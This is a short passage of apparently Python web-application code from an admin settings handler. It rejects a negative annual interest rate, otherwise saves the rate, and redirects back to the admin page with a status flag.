    if rate < 0:
        return RedirectResponse(url="/admin?settings=error", status_code=303)

    await set_annual_interest_rate(rate)
    return RedirectResponse(url="/admin?settings=saved", status_code=303)
